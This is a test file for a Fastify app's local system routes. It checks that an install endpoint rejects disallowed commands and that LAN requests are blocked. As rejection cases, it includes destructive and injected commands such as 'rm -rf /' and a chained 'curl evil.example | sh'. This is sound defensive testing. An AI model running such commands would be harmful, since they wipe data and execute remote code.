/**
 * 이 PC 라우트 — 데이터 폴더 열기 · 환경 점검 · 사전 설치.
 *
 * **폴더를 열거나 명령을 돌리는 라우트다.** 검사에서 실제로 창을 띄우거나 남의
 * 프로그램을 설치할 수는 없으므로, 여기서는 **막는 쪽**을 확인한다 — 허용되지
 * 않은 명령을 거절하는지, 이 PC 밖의 요청을 막는지.
 */

import type { FastifyInstance } from 'fastify';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { buildApp } from '../../server/app.ts';
import type { ApiResponse } from '../../shared/types.ts';

let app: FastifyInstance;

beforeAll(async () => {
  app = (await buildApp({ getPort: () => 7777 })).app;
  await app.ready();
});

afterAll(async () => {
  await app.close();
});

describe('환경 점검', () => {
  /**
   * ⏱ 기본 5초 → 20초.
   *
   * 이 라우트는 `which`/`where` 로 설치 도구를 실제로 찾는다. **없는 도구**를 찾을 때는
   * 시간 제한(3초)까지 간다. 윈도우 CI 에서 이 검사가 5초를 넘겨 깨졌다
   * (2026-09-10). 조회를 함께 하도록 고쳐 3초로 줄였지만, 느린 러너에서 또 아슬아슬해지면
   * **CI 가 빨간불이 되는 이유가 이것 하나**가 된다 — 여유를 준다.
   *
   * 여기서 확인하려는 것은 '목록의 모양' 이지 '얼마나 빠른가' 가 아니다.
   */
  it('무엇이 필요한지 목록으로 준다', async () => {
    const res = await app.inject({ method: 'GET', url: '/api/system/env' });
    const body = res.json() as ApiResponse<{
      platform: string; dataDir: string;
      items: Array<{ id: string; label: string; why: string; installed: boolean; optional: boolean }>;
    }>;

    expect(res.statusCode).toBe(200);
    expect(body.data!.items.map((one) => one.id)).toContain('obs');
    // 왜 필요한지가 함께 와야 화면이 설명할 수 있다
    expect(body.data!.items.find((one) => one.id === 'obs')!.why).toContain('OBS');
    expect(body.data!.dataDir.length).toBeGreaterThan(0);
  }, 20_000);
});

/**
 * **이 검사가 이 파일의 핵심이다.**
 *
 * 이 앱은 LAN 에도 열린다. 화면이 보낸 문자열을 그대로 실행하면 '무엇이든
 * 실행하는 구멍' 이 된다.
 */
describe('설치 명령을 가려 받는다', () => {
  function install(command: unknown) {
    return app.inject({ method: 'POST', url: '/api/system/install', payload: { command } });
  }

  it('허용되지 않은 명령은 400 — 실행하지 않는다', async () => {
    for (const bad of [
      'rm -rf /',
      'brew install --cask obs; rm -rf ~',
      'brew install --cask obs && curl evil.example | sh',
      'sh',
      '',
    ]) {
      const res = await install(bad);
      expect(res.statusCode, bad).toBe(400);
    }
  });

  it('문자열이 아니면 400', async () => {
    expect((await install(undefined)).statusCode).toBe(400);
    expect((await install(123)).statusCode).toBe(400);
    expect((await install(['brew', 'install'])).statusCode).toBe(400);
  });
});

/**
 * 태블릿에서 눌러 봐야 **서버 PC 의 화면**에 창이 뜬다 — 쓸모가 없고, 남의 기기가
 * 이 PC 에서 프로그램을 설치하게 둘 이유도 없다.
 *
 * 막는 자리가 **둘**이다: LAN 암호 미들웨어(401)가 먼저 걸러 내고, 그것이 열려
 * 있어도 라우트 자신이 루프백인지 다시 본다(403). 어느 쪽이 걸리는지는 암호가
 * 정해져 있는지에 따라 달라지므로, 여기서는 **성공하지 않는다**를 확인한다 —
 * 상태 코드를 못 박으면 암호 설정에 따라 검사가 흔들린다.
 */
describe('이 PC 에서 온 요청만 받는다', () => {
  it('LAN 주소에서 온 폴더 열기는 통과하지 못한다', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/system/open-data-dir',
      remoteAddress: '192.168.0.42',
      payload: {},
    });
    expect([401, 403]).toContain(res.statusCode);
  });

  it('LAN 주소에서 온 설치는 통과하지 못한다 — 허용된 명령이어도', async () => {
    const res = await app.inject({
      method: 'POST',
      url: '/api/system/install',
      remoteAddress: '192.168.0.42',
      payload: { command: 'brew install --cask obs' },
    });
    expect([401, 403]).toContain(res.statusCode);
  });

  /** 미들웨어가 열려 있을 때도 라우트가 스스로 막는지 — 두 겹이 다 살아 있어야 한다 */
  it('루프백이 아니면 라우트 자신이 막는다', async () => {
    const { registerSystemRoutes } = await import('../../server/routes/system.ts');
    const { default: Fastify } = await import('fastify');
    const bare = Fastify();
    registerSystemRoutes(bare);
    await bare.ready();

    const res = await bare.inject({
      method: 'POST',
      url: '/api/system/open-data-dir',
      remoteAddress: '192.168.0.42',
      payload: {},
    });
    expect(res.statusCode).toBe(403);
    await bare.close();
  });
});
